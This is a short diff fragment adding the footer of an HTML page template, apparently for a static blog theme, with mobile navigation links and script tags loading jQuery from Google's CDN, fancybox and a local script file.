+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
